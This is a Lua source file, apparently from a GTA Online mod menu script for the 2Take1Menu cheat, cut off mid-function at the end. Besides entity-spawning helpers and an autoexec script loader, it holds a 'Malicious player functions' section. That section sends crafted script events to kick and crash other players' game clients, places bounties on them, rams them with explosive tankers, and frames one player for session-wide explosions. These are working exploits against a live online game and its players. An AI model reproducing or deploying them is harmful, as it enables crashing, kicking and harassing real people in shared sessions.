	-- Teleport entity
		local function teleport(Entity, coords)
			if get_control_of_entity(Entity) then
				entity.set_entity_coords_no_offset(Entity, coords)
				return true
			end
		end

	-- Get ground z
		local function get_coord_with_ground_z(Entity)
			local time = utils.time_ms() + 3000
			local pos = entity.get_entity_coords(Entity)
			local Z_status, Z
			get_control_of_entity(Entity)
			while time > utils.time_ms() and not Z_status do
				entity.set_entity_coords_no_offset(Entity, pos + v3(0, 0, 3))
				Z_status, Z = gameplay.get_ground_z(entity.get_entity_coords(Entity))
				pos.z = Z
				system.yield(0)
			end
			return pos
		end

	-- World vector
		local function get_vector_relative_to_entity(Entity, distance_from_entity)
			local pos = entity.get_entity_coords(Entity)
			local rot = entity.get_entity_rotation(Entity)
	        rot:transformRotToDir()
			return pos + rot * distance_from_entity
		end

	-- Get vector where collision
		local function get_collision_vector(m, Ped)
			local me = player.get_player_coords(m)
			local pos, rot = me, cam.get_gameplay_cam_rot()
	        rot:transformRotToDir()
	        local pos = rot * 1000 + pos
	        local n, Pos = worldprobe.raycast(me, pos, -1, Ped)
	        local d = me - Pos
	        return Pos, math.abs(d.x) + math.abs(d.y), pos
	    end

	-- Spawn an entity
		local function spawn_entity(hash, coords, direction_entity_will_face, fully_pimp_vehicle_after_spawned, give_godmode, ped_type)
			if request_model(hash) and type(coords) == "userdata" and tonumber(hash) then
				local Entity
				if streaming.is_model_a_vehicle(hash) then
					if fully_pimp_vehicle_after_spawned then
						Entity = vehicle.create_vehicle(hash, player.get_player_coords(player.player_id()) + v3(0, 0, 35), direction_entity_will_face, true, false)
						max_car(Entity)
						entity.set_entity_coords_no_offset(Entity, coords)
						entity.set_entity_heading(Entity, direction_entity_will_face)
					else
						Entity = vehicle.create_vehicle(hash, coords, direction_entity_will_face, true, false)
					end
				elseif streaming.is_model_a_ped(hash) then
					Entity = ped.create_ped(ped_type, hash, coords, direction_entity_will_face, true, false)
				elseif streaming.is_model_an_object(hash) then
					Entity = object.create_object(hash, coords, true, true)
				end
				if give_godmode then
					modify_entity_godmode(Entity, true)
				end
				streaming.set_model_as_no_longer_needed(hash)
				return Entity
			end
			return HANDLER_POP
		end

	-- Remove players from entity table
		local function remove_player_entities(table_of_entities)
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					if player.get_player_vehicle(pid) ~= 0 then
						local index_of_player_car = table.get_index_of_value(table_of_entities, player.get_player_vehicle(pid))
						if index_of_player_car then
							table.remove(table_of_entities, index_of_player_car)
						end
					end
					local index_of_player_ped = table.get_index_of_value(table_of_entities, player.get_player_ped(pid))
					if index_of_player_ped then
						table.remove(table_of_entities, index_of_player_ped)
					end
				end
			end
			return table_of_entities
		end

	-- Get table of entities with respect to distance on each entity type
		local function get_table_of_entities_with_respect_to_distance_and_set_limit(entity_tables, ped)
			local new_sorted_tables = {}
			for i, entity_table in pairs(entity_tables) do
				table.sort(entity_table[1], function(a, b) return (get_distance_between(a, ped) < get_distance_between(b, ped)) end)
				if entity_table[3] then
					entity_table[1] = remove_player_entities(entity_table[1])
				end
				if entity_table[2] then
					for i = entity_table[2], #entity_table[1] do
						table.remove(entity_table[1], #entity_table[1])
					end
				end
				if entity_table[4] then
					local temp = {}
					for i = 1, #entity_table[1] do
						if get_distance_between(ped, entity_table[1][i]) < entity_table[4] then
							temp[#temp + 1] = entity_table[1][i]
						end
					end
					entity_table[1] = temp
				end
				new_sorted_tables[#new_sorted_tables + 1] = entity_table[1]
			end
			return table.merge({}, new_sorted_tables)
		end

	-- Clear entities
		local function clear_entities(table_of_entities, time)
			local me = player.player_id()
			local my_ped = get_ped_closest_to_your_pov()
			table_of_entities = remove_player_entities(table_of_entities)
			if not time then
				time = 3000
			end
			time = utils.time_ms() + time
			local pos = v3(13000, 13000, 0)
			repeat
					for i = 1, #table_of_entities do
						if entity.is_an_entity(table_of_entities[i]) and get_control_of_entity(table_of_entities[i], 75) then
							entity.delete_entity(table_of_entities[i])
							if entity.is_an_entity(table_of_entities[i]) then
								entity.set_entity_coords_no_offset(table_of_entities[i], pos + v3(math.random(-5000, 8000), math.random(-5000, 8000), math.random(-2400, 2400)))
								entity.set_entity_as_no_longer_needed(table_of_entities[i])
							end
							random_wait(10)
						else
							random_wait(80)
						end
					end
					system.yield(0)
			until not table.is_any_true(table_of_entities, entity.is_an_entity) or utils.time_ms() > time
			return not table.is_any_true(table_of_entities, entity.is_an_entity)
		end

		local function remove_player_vehicle(pid)
			if player.get_player_coords(pid).z < -20 then 
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), player.get_player_coords(pid))
				system.yield(2000)
			end
			local time = utils.time_ms() + 3000
			while player.is_player_in_any_vehicle(pid) and time > utils.time_ms() do
				system.yield(0)
				ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
			end
			local their_vehicle = player.get_player_vehicle(pid)
			if not player.is_player_in_any_vehicle(pid) and get_control_of_entity(their_vehicle) then
				entity.delete_entity(their_vehicle)
				if entity.is_an_entity(their_vehicle) then
					entity.set_entity_coords_no_offset(their_vehicle)	
					entity.set_entity_as_no_longer_needed(their_vehicle)
				end
			end
			return not entity.is_an_entity(their_vehicle)
		end
	-- Ram function
		local function spawn_and_push_a_vehicle_in_direction(pid, clear_vehicle_after_ram, distance_from_target, hash_or_entity, offset)
			local speed
			if math.random(0, 1) == 1 then
				speed = setting["Ram speed"]
				distance_from_target = -distance_from_target
			else
				speed = -setting["Ram speed"]
			end
			local their_ped = player.get_player_ped(pid)
			if not entity.is_entity_dead(their_ped) and player.get_player_coords(pid).z > -20 then
				local me, v = player.player_id(), v3()
				local direction_player_is_facing = player.get_player_heading(pid)
				if player.is_player_in_any_vehicle(pid) then
					local their_car = player.get_player_vehicle(pid)
					network.request_control_of_entity(their_car)
					v = entity.get_entity_velocity(their_car) / speed
				end
				local car = hash_or_entity
				if not entity.is_an_entity(hash_or_entity) then
					car = spawn_entity(hash_or_entity, get_vector_relative_to_entity(their_ped, distance_from_target) + offset, direction_player_is_facing, false, false, 0)
				end
				entity.set_entity_max_speed(car, speed)
				if entity.is_an_entity(car) then
					vehicle.set_vehicle_forward_speed(car, speed)
					if clear_vehicle_after_ram then
						system.yield(250)
						clear_entities({car})
					end
					entity.set_entity_as_no_longer_needed(player.get_player_vehicle(pid))
					return car
				end
				return HANDLER_CONTINUE
			else
				return HANDLER_CONTINUE
			end
		end

	-- Max ped's combat attributes
		local function set_combat_attributes(Ped, god, noblip, all_true, use_vehicle, driveby, cover, leave_vehicle, unarmed_fight_armed, taunt_in_vehicle, always_fight, ignore_traffic, use_fireing_weapons)
			modify_entity_godmode(Ped, god)
			local attributes = 
				{
					{0, cover}, {1, use_vehicle}, {2, driveby}, {3, leave_vehicle}, {5, unarmed_fight_armed}, {20, taunt_in_vehicle},
					{46, always_fight}, {52, ignore_traffic}, {1424, use_fireing_weapons} 
				}
			for i, attribute in pairs(attributes) do
				ped.set_ped_combat_attributes(Ped, attribute[1], (all_true or attribute) and true)
			end 
			ped.set_ped_combat_ability(Ped, 100)
			ped.set_ped_combat_range(Ped, 2)
			ped.set_ped_combat_movement(Ped, 2)
			if not noblip then
				local blip = ui.add_blip_for_entity(Ped)
				ui.set_blip_sprite(blip, 310)
				ui.set_blip_colour(blip, 29)
			end
		end

	-- Set weapons
		local function set_ped_weapon_attachments(Ped, random_attachments, weapon_hash)
			weapon.set_ped_weapon_tint_index(Ped, weapon_hash, math.random(1, math.max(weapon.get_weapon_tint_count(weapon_hash), 1)))
			local attachments
			if random_attachments then
				attachments = weapon_mapper.get_random_attachments_for_weapon(weapon_hash)
			else
				attachments = weapon_mapper.get_maxed_attachments_for_weapon(weapon_hash)
			end
			for i, component in pairs(attachments) do
				weapon.give_weapon_component_to_ped(Ped, weapon_hash, component)
			end
			local void, ammo = weapon.get_max_ammo(Ped, weapon_hash)
			weapon.set_ped_ammo(Ped, weapon_hash, ammo)
		end

	-- Spawn self car
		local function spawn_car()
			if setting["Always ask what #vehicle#"] then
				txt.what_vehicle_model_in_use = get_input(language["Type in what car to use /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"])
			end
			local me, hash = player.player_id(), vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use)
			local car = spawn_entity(hash, get_vector_relative_to_entity(player.get_player_ped(me), 5), player.get_player_heading(me), false, setting["Spawn #vehicle# in godmode"])
			if setting["Spawn #vehicle# maxed"] then
				max_car(car)
			end
			if car then
				temp.your_vehicle_entity_ids[#temp.your_vehicle_entity_ids + 1] = player.get_player_vehicle(me)
				decorator.decor_set_int(car, "MPBitset", 1 << 10)
				if setting["Spawn inside of spawned #vehicle#"] then
					ped.set_ped_into_vehicle(player.get_player_ped(me), car, -1)
					if setting["Air #vehicle# spawn mid-air"] then
						if streaming.is_model_a_heli(hash) then
							teleport(car, player.get_player_coords(me) + v3(0, 0, 100))
							vehicle.set_vehicle_forward_speed(car, 200)
						end
						if streaming.is_model_a_plane(hash) then
							teleport(car, player.get_player_coords(me) + v3(0, 0, 250))
							vehicle.set_vehicle_forward_speed(car, 200)
						end
					end
				end
				if setting["Always f1 wheels on #vehicle#"] then
					vehicle.set_vehicle_wheel_type(car, 10)
				end
				if setting["Delete old #vehicle#"] then
					for i, car in pairs(temp.your_vehicle_entity_ids) do
						entity.delete_entity(car)
					end
					temp.your_vehicle_entity_ids = {}
				end
				temp.your_vehicle_entity_ids[#temp.your_vehicle_entity_ids + 1] = car
			end
		end

	-- Check if target is valid for remote vehicle stuff
		local function is_target_viable(pid, is_a_toggle, feature)
			if not player.is_player_valid(pid) or player.is_player_modder(pid, -1) or (player.get_player_coords(pid).z > -20 and not player.is_player_in_any_vehicle(pid)) then
				return
			end
			local me = player.player_id()
			local my_entity
			if player.is_player_in_any_vehicle(me) then
				my_entity = player.get_player_vehicle(me)
			else
				my_entity = player.get_player_ped(me)
			end
			local time = utils.time_ms() + 1500
			while time > utils.time_ms() do
				system.yield(0)
				if player.is_player_in_any_vehicle(pid) or (is_a_toggle and not feature.on) then
					return player.get_player_vehicle(pid), globals.get_player_personal_vehicle(pid)
				else
					local pos = player.get_player_coords(pid)
					pos.z = math.abs(pos.z) + 45
					entity.set_entity_coords_no_offset(my_entity, pos)
				end
			end
			return false, globals.get_player_personal_vehicle(pid)
		end

-- Settings stuff
	-- What flags function
		local function get_all_modder_flags(pid, type)
			local number_of_flags = 0
			local all_flags = ""
			if player.is_player_valid(pid) then
				for i, k in pairs(modIdStuff) do
					if player.is_player_modder(pid, k) then
						if setting[type..player.get_modder_flag_text(k)] then
							number_of_flags = number_of_flags + 1
						end
						all_flags = all_flags..player.get_modder_flag_text(k)..", "
					end
				end
				if all_flags ~= "" then
					all_flags = all_flags:sub(1, #all_flags - 2)
				end
			end
			return number_of_flags, all_flags
		end

	-- Mod tag related settings
		temp.flags_to_turn_off = -- Flags that are off by default
			{
				{ -- Modder logging tags
					keks_custom_modder_flags[1][1],
					keks_custom_modder_flags[2][1], 
					keks_custom_modder_flags[3][1], 
					keks_custom_modder_flags[5][1], 
					keks_custom_modder_flags[6][1], 
					1
				},

				{ -- Auto kicker tags 
					keks_custom_modder_flags[1][1], 
					keks_custom_modder_flags[2][1], 
					keks_custom_modder_flags[5][1], 
					keks_custom_modder_flags[6][1], 
					1 
				},

				{ -- Auto unmark flags
				}
			}

		for index_of_setting_properties, setting_property in pairs(o.modder_flag_setting_properties) do
			local number_of_settings_before_current_loop = #setting_names
			local number_of_toggle_settings_before_current_loop = #toggle
			menu.add_feature(language["Invert all switches /;/feature|_|"], "action", setting_property[3].id, function()
				for i = 1, #modIdStuff do
					local modder_flag_text = player.get_modder_flag_text(modIdStuff[i])
					if toggle[number_of_toggle_settings_before_current_loop + i][2].on then
						toggle[number_of_toggle_settings_before_current_loop + i][2].on = false
						setting[setting_property[2]..modder_flag_text] = false
					else
						toggle[number_of_toggle_settings_before_current_loop + i][2].on = true
						setting[setting_property[2]..modder_flag_text] = true
					end
				end
			end)
			for i = #setting_names, #setting_names + #modIdStuff - 1 do
				local current_modder_int_flag_index = (i - number_of_settings_before_current_loop) + 1
				local modder_flag_text = player.get_modder_flag_text(modIdStuff[current_modder_int_flag_index])
				setting_names[#setting_names + 1] = setting_property[1]..modder_flag_text
				if not table.get_index_of_value(temp.flags_to_turn_off[index_of_setting_properties], modIdStuff[current_modder_int_flag_index]) then
					setting[setting_names[#setting_names]] = true
				else
					setting[setting_names[#setting_names]] = false
				end
				toggle[#toggle + 1] = {setting_property[1]..modder_flag_text, menu.add_feature(setting_property[4]..modder_flag_text, "toggle", setting_property[3].id, function(f) 
					if f.on then
						setting[setting_property[1]..modder_flag_text] = true 
					else
						setting[setting_property[1]..modder_flag_text] = false
					end 
				end)}
			end
		end

	-- Initialize general settings
		for i, k in pairs(general_settings) do
			setting_names[#setting_names + 1] = k[1]
			setting[setting_names[#setting_names]] = k[2]
		end

-- Kek's script loader
	local function Temp()
		local contents_of_autoexec_file = get_file_string("scripts\\autoexec.lua", "*a")
		if not contents_of_autoexec_file or not contents_of_autoexec_file:find("sjhvnciuyu44khdjkhUSx") then
			local file = io.open(o.home.."scripts\\autoexec.lua", "w+")
			file:write("\nlocal sjhvnciuyu44khdjkhUSx = menu.add_feature(\"\", \"action\", 0, function(f)\n")
			file:write("	local appdata_path = utils.get_appdata_path(\"PopstarDevs\", \"\")..\"\\\\2Take1Menu\\\\\"\n")
			file:write("	local scripts = {}\n")
			file:write("	for i, k in pairs(scripts) do\n")
			file:write("		if utils.file_exists(appdata_path..\"scripts\\\\\"..k) then\n")
			file:write("			system.yield(50)\n")
			file:write("			dofile(appdata_path..\"scripts\\\\\"..k)\n")
			file:write("		end\n")
			file:write("	end\n")
			file:write("end)\n")
			file:write("sjhvnciuyu44khdjkhUSx.hidden = true\n")
			file:write("sjhvnciuyu44khdjkhUSx.on = true")
			file:flush()
			file:close()
		end
	end

	menu.add_feature(language["Toggle on / off script loader /;/feature|_|"], "action", u.script_loader.id, function()
		Temp()
		local str = get_file_string("scripts\\autoexec.lua", "*a")
		if str and str:sub(1, 6) ~= "return" then
			local file = io.open(o.home.."scripts\\autoexec.lua", "w+")
			file:write("return"..str)
			file:flush()
			file:close()
			msg(language["Turned off script loader /;/msg|_|"], 212, true)
		else
			modify_entry("scripts\\autoexec.lua", {"return", ""}, true, true)
			msg(language["Turned on script loader /;/msg|_|"], 212, true)
		end
	end)

	menu.add_feature(language["Empty script loader file /;/feature|_|"], "action", u.script_loader.id, function()
		local file = io.open(o.home.."scripts\\autoexec.lua", "w+")
		file:close()
		msg(language["Emptied script loader /;/msg|_|"], 212, true)
	end)

	menu.add_feature(language["Add script to auto loader /;/feature|_|"], "action", u.script_loader.id, function()
		Temp()
		local str = get_input(language["Type in the name of the lua script to add. /;/input_does_not_support_unicode|_|"], "", 128, 0):lower():gsub(".lua", "")
		local c = get_file("scripts\\", "lua", "", str..".lua", true)
		if not utils.file_exists(o.home.."scripts\\autoexec.lua") then
			local file = io.open(o.home.."scripts\\autoexec.lua", "w+")
			file:close()
		end
		if c[1] and not c[1]:find("autoexec.lua") then 
			if not search_for_match_and_get_line("scripts\\autoexec.lua", {c[2]}) then
				local str = get_file_string("scripts\\autoexec.lua", "*a")
				modify_entry("scripts\\autoexec.lua", {"	local scripts = {}", "	local scripts = {}\n	scripts[#scripts + 1] = \""..c[2].."\""}, true, true)
				msg(language["Added /;/msg|_|"].." "..c[1]:match(o.home.."scripts\\(.*)").." "..language["to script loader /;/msg|_|"], 212, true)
			else
				msg(c[1]:match(o.home.."scripts\\(.*)").." "..language["is already in the script loader /;/msg|_|"], 210, true)
			end
		else
			msg(language["Couldn't find file /;/msg|_|"], 6, true)
		end
	end)

	menu.add_feature(language["Remove script from auto loader /;/feature|_|"], "action", u.script_loader.id, function()
		Temp()
		local str = get_input(language["Type in the lua script you want to remove. /;/input_does_not_support_unicode|_|"], "", 128, 0):lower():gsub(".lua", "")
		local c = get_file("scripts\\", "lua", "", str..".lua", true)
		local result = modify_entry("scripts\\autoexec.lua", {"	scripts[#scripts + 1] = \""..c[2].."\""}, true)
		if result == 1 then
			msg(language["Removed /;/msg|_|"].." "..c[1]:match(o.home.."scripts\\(.*)").." "..language["from script loader /;/msg|_|"], 140, true)
		elseif result == 2 then
			msg(language["Couldn't find file /;/msg|_|"], 6, true)
		else
			msg(language["autoexec doesn't exist /;/msg|_|"], 6, true)
		end
	end)

-- Language config
	for i, file_name in pairs(utils.get_all_files_in_directory(o.kek_menu_stuff_path.."kekMenuLibs\\Languages", "txt")) do
		menu.add_feature(language["Set /;/feature|_|"].." "..file_name:gsub(".txt", "").." "..language["as default language. /;/feature|_|"], "action", u.language_config.id, function()
			local file = io.open(o.kek_menu_stuff_path.."kekMenuLibs\\Languages\\language.ini", "w+")
			file:write(file_name)
			file:flush()
			file:close()
			msg(file_name:gsub(".txt", "").." "..language["was set as the default language. /;/msg|_|"], 210, true)
			local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuLibs\\Languages\\"..file_name, "*l")
			if str:match("§Version§ (.*) /;/DO NOT CHANGE THIS VALUE|_|") ~= is_keks_menu_loaded then
				msg(language["This language file is outdated, please update it. You can still use it, no problem. /;/msg|_|"], 6, true)
			end
		end)
	end 

-- Malicious player functions
	-- Send script event
		local function send_script_event(hash, target, args, friend_condition)
			if player.is_player_valid(target) and target ~= player.player_id() and (not friend_condition or not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(target))) and table.is_all_true(args, function(arg) return tonumber(arg) and math.ceil(arg) == arg end) then
				script.trigger_script_event(hash, target, args)
			end
		end

	-- Get arg table
		local function get_full_arg_table(pid)
			local m = math.random
			local a, b = -2147483647, 2147483647
			return { pid, m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b),
			m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), 
			m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b),
			m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b), m(a, b)}
		end

	-- kick
		local function kick(pid)
			if pid and player.is_player_valid(pid) and not network.network_is_host() then
				if not player.is_player_modder(pid, -1) then
					send_script_event(-435067392, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)})
					for i = 1, 10 do
						if not player.is_player_valid(pid) then
							return
						end
						system.yield(40)
					end
				end
				local args = get_full_arg_table(pid)
				args[2] = math.random(-2147483647, -1)
				args[24] = script.get_global_i(1630317 + (1 + (pid * 595)) + 506)
				send_script_event(-1491386500, pid, args)
				send_script_event(-1729804184, pid, {pid, math.random(-2147483647, 2147483647), pid})
				send_script_event(1428412924, pid, {pid, math.random(-2147483647, 2147483647)})
				send_script_event(823645419, pid, {pid, -1, -1, -1, -1})
				send_script_event(1070934291, pid, {pid, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10})
				send_script_event(-442306200, pid, {-1, 0})
				for i, k in pairs({-1726396442, 154008137, 428882541, -1714354434}) do
					send_script_event(-1949011582, pid, {pid, k, i, 1, -10, -10, -10, -10, -10, pid, -10, -10, -10})
				end
				for i = 1, 10 do
					for i, k in pairs(kick_script_events) do
						if network.network_is_host() then
							network.network_session_kick_player(pid)
							return
						end
						system.yield(0)
						send_script_event(k, pid, get_full_arg_table(pid))
					end
				end
			elseif pid then
				network.network_session_kick_player(pid)
			end
		end

	-- Script event crash
		local function script_event_crash(pid)
			if pid then
				if script.get_host_of_this_script() == pid then
					for i = 0, 14 do
						send_script_event(-2122716210, pid, {pid, i})
					end
					for i = 1, 20 do
						system.yield(0)
						local parameters = {pid}
						for I = 1, 120 do
							for i = 2, 26 do
								parameters[i] = math.random(-10000, 10000)
							end
							send_script_event(-1882923979, pid, parameters)
						end
					end
				end
				for i = 1, 120 do
					local parameters = {pid, -1139568479, math.random(0, 4), math.random(0, 1)}
					for i = 5, 13 do
						parameters[i] = math.random(-2147483647, 2147483647)
					end
					parameters[10] = pid
					send_script_event(-1949011582, pid, parameters)
				end
				for i = 1, 5 do
					for I, k in pairs(crash_script_events) do
						local parameters = {}
						for L = 1, 10 do
							parameters[L] = math.random(1000000, 2147483647)
						end
						send_script_event(k, pid, parameters)
					end
				end
			end
		end

	-- Get host
		local function get_people_in_front_of_person_in_host_queue(pid)
			local hosts, friends = {}, {}
			local player_host_priority = player.get_player_host_priority(pid)
			for pid = 0, 31 do
				if player.is_player_valid(pid) then
					if player.get_player_host_priority(pid) < player_host_priority and player.get_host() ~= pid then
						hosts[#hosts + 1] = pid
					end
					if network.is_scid_friend(player.get_player_scid(pid)) then
						friends[#friends + 1] = pid
					end
				end
			end
			local host = player.get_host()
			if not table.get_index_of_value(hosts, host) then
				hosts[#hosts + 1] = host
				if network.is_scid_friend(player.get_player_scid(host)) then
					friends[#friends + 1] = host
				end
			end
			return hosts, friends
		end

		local function get_host(pid, use_kick_limiter)
			system.yield(0)
			local hosts, friends = get_people_in_front_of_person_in_host_queue(pid)
			if setting["Exclude friends from attacks #malicious#"] and #friends > 0 then
				msg(language["One of the people further in host queue is your friend! Cancelled. /;/msg|_|"], 212, true)
				return friends, true
			elseif use_kick_limiter and #hosts > setting["Max number of people to kick in force host"] then
				msg(language["Force host:\\nCancelled. Requires to kick /;/msg|_|"].." "..#hosts.." "..language["people in order to get host. /;/msg|_|"], 6, true)
				return hosts, false
			else
				for i, pid in pairs(hosts) do
					script.trigger_script_event(-435067392, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)})
					system.yield(0)
				end
			end
			return {}, false
		end

	-- Give bounty 
		local function set_bounty(script_target)
			if player.is_player_valid(script_target) and not player.is_player_modder(script_target, -1) and player.player_id() ~= script.get_host_of_this_script() and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(script_target))) then
				for pid = 0, 31 do
					if player.is_player_valid(pid) and not player.is_player_modder(pid, -1) then
						decorator.decor_set_int(player.get_player_ped(pid), "MPBitset", 3)
						script.trigger_script_event(-116602735, script_target, {script_target, pid, 3, 10000, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, script.get_global_i(1652336 + 9), script.get_global_i(1652336 + 10)})
					end
				end
				return HANDLER_CONTINUE
			end
		end

		local function disable_vehicle(pid, friend_condition)
			if player.get_player_coords(pid).z > -20 and not player.is_player_in_any_vehicle(pid) then
				return
			end
			local pos = player.get_player_coords(pid)
			send_script_event(-152440739, pid, {pid, math.round(pos.x), math.round(pos.y), math.round(pos.z), 0}, friend_condition)
			send_script_event(-1662268941, pid, {pid, pid}, friend_condition)
			send_script_event(-1333236192, pid, {pid, 0, 0, 0, 0, 1, pid, gameplay.get_frame_count()}, friend_condition)
			return HANDLER_CONTINUE
		end

	-- Chat judge reactions
		local function chat_judge_reactions(pid, type)
			if player.is_player_valid(pid) then
				local player_name = player.get_player_name(pid)
				if type == 1 then 
					set_bounty(pid)
					msg(language["Chat judge:\\nBounty set on /;/msg|_|"].." "..player_name..".", 140, setting["Chat judge #notifications#"])
				elseif type == 2 then
					local time = utils.time_ms() + 5000
					msg(language["Chat judge:\\nRamming /;/msg|_|"].." "..player_name.." "..language["with explosive tankers /;/msg|_|"], 140, setting["Chat judge #notifications#"])
					while time > utils.time_ms() do
						spawn_and_push_a_vehicle_in_direction(pid, true, 8, 3564062519, v3())
						system.yield(100)
					end
				elseif type == 3 then
					disable_vehicle(pid)
					msg(language["Chat judge:\\nKicking player out of their vehicle. /;/msg|_|"], 140, setting["Chat judge #notifications#"])
				elseif type == 4 then
					local their_ped = player.get_player_ped(pid)
					local me = player.player_id()
					local their_pid = pid
					for pid = 0, 31 do
						if player.is_player_valid(pid) and pid ~= their_pid and pid ~= me then
							fire.add_explosion(player.get_player_coords(pid), 29, true, false, 0, their_ped)
						end
					end
					msg(language["Chat judge:\\nBlaming /;/feature|_|"].." "..player_name.." "..language["for killing session. /;/feature|_|"], 140, setting["Chat judge #notifications#"])
				elseif type == 5 then
					msg(language["Chat judge:\\nKicking /;/msg|_|"].." "..player_name, 140, setting["Chat judge #notifications#"])
					kick(pid)
				elseif type == 6 then
					msg(language["Chat judge\\nCrashing /;/msg|_|"].." "..player_name, 140, setting["Chat judge #notifications#"])
					script_event_crash(pid)
				end
			end
		end

	-- Get seat for ped
		local function get_seat(car, seat_to_grab)
			system.yield(0)
			if vehicle.get_vehicle_max_number_of_passengers(car) >= seat_to_grab + 2 then
				local ped_in_requested_seat = vehicle.get_ped_in_vehicle_seat(car, seat_to_grab)
				if ped_in_requested_seat then
					ped.clear_ped_tasks_immediately(ped_in_requested_seat)
					if not ped.is_ped_a_player(ped_in_requested_seat) then
						clear_entities({ped_in_requested_seat})
					else
						system.yield(500)
					end
				end
				if not vehicle.get_ped_in_vehicle_seat(car, seat_to_grab) then
					return seat_to_grab
				end
			end
			if vehicle.get_free_seat(car) ~= -2 then
				return vehicle.get_free_seat(car)
			end
			if vehicle.get_free_seat(car) == -2 then
				get_seat(car, 0)
			end
		end

	-- Glitch vehicle
			local function glitch_vehicle(target_ped, feature)
				local their_car = ped.get_vehicle_ped_is_using(target_ped)
				local seat = vehicle.get_free_seat(their_car)
				if their_car ~= 0 then
					local Entity, Ped
					local seat = get_seat(their_car, vehicle.get_free_seat(their_car))
					if seat then
						local pos = entity.get_entity_coords(their_car)
						Ped = spawn_entity(pedestrian_mapper.GetHashFromModel("?"), pos + v3(5, 6, 30), 0, false, false, 4)
						entity.set_entity_visible(Ped, false)
						ped.set_ped_into_vehicle(Ped, their_car, seat)
						Entity = spawn_entity(gameplay.get_hash_key(table_of_glitch_entity_models[math.random(1, #table_of_glitch_entity_models)]), pos + v3(0, 0, 40), 0, false, false, 4)
						entity.set_entity_visible(Entity, false)
						entity.attach_entity_to_entity(Entity, Ped, 0, v3(), v3(math.random(0, 180), math.random(0, 180), math.random(0, 180)), true, true, entity.get_entity_type(Entity) == 4, 0, false)
						modify_entity_godmode(Entity, true)
						local time = utils.time_ms() + 5000
						while (feature and feature.on) or (not feature and time > utils.time_ms()) and table.is_all_true({Ped, Entity}, entity.is_an_entity) do
							system.yield(100)
							if not ped.is_ped_in_vehicle(Ped, ped.get_vehicle_ped_is_using(target_ped)) then
								break
							end
						end
						clear_entities({Ped, Entity})
					end
				end
			end

-- Modder detection
	-- Init nethook
		temp.net_hook = hook.register_net_event_hook(function(pid, me, event)
			if not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(pid)) then
				if setting["Kick any vote kickers"] and event == 64 then
					msg(player.get_player_name(pid).." "..language["sent vote kick. Kicking them... /;/msg|_|"], 6, true)
					if not network.network_is_host() then
						send_script_event(-435067392, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)})
						send_script_event(1070934291, pid, {pid, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10})
					else
						network.network_session_kick_player(pid)
					end
				end
				if setting["Modded net event detection"] and table.get_index_of_value({12, 13, 14, 78, 74}, event) then
					player.set_player_as_modder(pid, keks_custom_modder_flags[6][1])
				end
			end
		end)

	-- Init scripthook

		toggle[#toggle + 1] = {"Modded script event detection", menu.add_feature(language["Modded script event /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			local script_spam_tracker = {}
			if f.on then
				setting["Modded script event detection"] = true
				u.script_hook = hook.register_script_event_hook(function(pid, me, parameters, number_of_pars)
					local rid = player.get_player_scid(pid)
					if setting["Modded script event detection"] and not player.is_player_modder(pid, keks_custom_modder_flags[8][1]) and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(rid)) then
						if not script_spam_tracker[rid] or utils.time_ms() > script_spam_tracker[rid][1] then
							script_spam_tracker[rid] = {utils.time_ms() + 4500, 0}
						end
						script_spam_tracker[rid][2] = script_spam_tracker[rid][2] + 1
						if parameters[2] ~= pid or number_of_pars > 40 or number_of_pars == 1 or script_spam_tracker[rid][2] > 75 then
							msg(player.get_player_name(pid).." "..language["sent a modded script event. /;/msg|_|"], 6, true)
							player.set_player_as_modder(pid, keks_custom_modder_flags[8][1])
						end
					end
				end)
			else
				setting["Modded script event detection"] = false
				hook.remove_script_event_hook(u.script_hook)
				u.script_hook = nil
			end
		end)}

	-- Stat detect function
		valuei["Severity"] = {"Modded stats severity", menu.add_feature(language["Modded stats, severity, click me /;/feature|_|"], "autoaction_value_i", u.modder_detection_settings.id, function(f)
			setting["Modded stats severity"] = f.value_i
			if controls.is_disabled_control_pressed(0, 215) then
				msg(language["How many modded stat detections are needed to tag them as modder /;/msg|_|"], 140, true)
				msg(language["Minor detections are 1 in severity, severe ones like modded name, are 3. /;/msg|_|"], 140, true)
			end
		end)}
		valuei["Severity"][2].min_i, valuei["Severity"][2].max_i, valuei["Severity"][2].mod_i = 1, 4, 1

		local function suspicious_stats(pid)
			local how_much_money_they_have, their_rank = globals.get_player_money(pid), globals.get_player_rank(pid)
			local their_kd, me, RID = globals.get_player_kd(pid), player.player_id(), player.get_player_scid(pid)
			if their_rank ~= 0 and not people_stat_detected[RID] and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and j ~= me and (how_much_money_they_have ~= globals.get_player_money(me) or their_rank ~= globals.get_player_rank(me) or their_kd ~= globals.get_player_kd(me)) then
				local misc_stats = 
					{
						globals.get_player_race_wins(pid),
						globals.get_player_golf_wins(pid),
						globals.get_player_shoot_wins(pid),
						globals.get_player_tennis_wins(pid),
